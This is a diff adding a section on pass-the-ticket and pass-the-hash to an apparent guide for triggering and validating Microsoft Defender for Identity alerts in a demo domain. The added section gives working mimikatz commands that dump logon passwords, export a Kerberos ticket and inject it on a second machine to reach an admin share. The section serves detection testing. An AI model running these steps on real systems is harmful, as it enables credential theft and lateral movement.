@@ -192,10 +192,30 @@ Detail in the alert:
 ![image1](https://raw.githubusercontent.com/DanielpFR/MDI/Images/Image20.png)  
 
 ## 10 - Suspected identity theft (pass-the-ticket) & (pass-the-hash)
-Pass-the-Ticket or Pass-The-Hash is a lateral movement technique in which attackers steal a Kerberos ticket or user's NTLM hash from one computer and use it to gain access to another computer by reusing the stolen ticket or user's NTLM hash. 
+Pass-the-Ticket or Pass-The-Hash is a lateral movement technique in which attackers steal a Kerberos ticket or user's NTLM hash from one computer and use it to gain access to another computer by reusing the stolen ticket or user's NTLM hash.  
 This detection is often miss-understanding; if you perform a Pass-The-Ticket from one security context to another security context on the same machine, you will not generate an MDI alert, this activity can only be seen with an EDR on a managed machine.  
 What MDI can detect, without any client agent and even if the activity is seen from an unmanaged machine (without EPP or EDR), is one Kerberos ticket (TGT) was issued to a user on a specific machine (Name, IP) and the same ticket is seen coming from another machine (Name, IP), so MDI can trigger a Suspected identity theft… 
 In this detection a Kerberos ticket is seen used on two (or more) different computers.  
+
+On the machine 1 where a domain user is in used (logon as Task, service, RDP, Interactive..), from a command line run as local admin :
+
+*mimikatz.exe privilege::debug*  
+*sekurlsa::logonpasswords*  
+*sekurlsa::tickets /export* => rename the Nuck's TGT file (or whatever) to nuck.kirbi
+
+On the machine 2, from a command line run as local admin :
+
+*mimikatz.exe privilege::debug*  
+*kerberos::ptt nuck.kirbi*  
+*Quit*
+*Klist* => check if the TGT for nuck is loaded
+*net use * \\server.msdemo.local\c$ /u:msdemo\nuck* => the stolen TGT from machine 1 will be presented to a DC to issue a TGS and access will be granted if nuck has the permission on server.msdemo.local
+
+Detail in the alert:  
+
+![image1](https://raw.githubusercontent.com/DanielpFR/MDI/Images/Image21.png)  
+
+
 
 
 
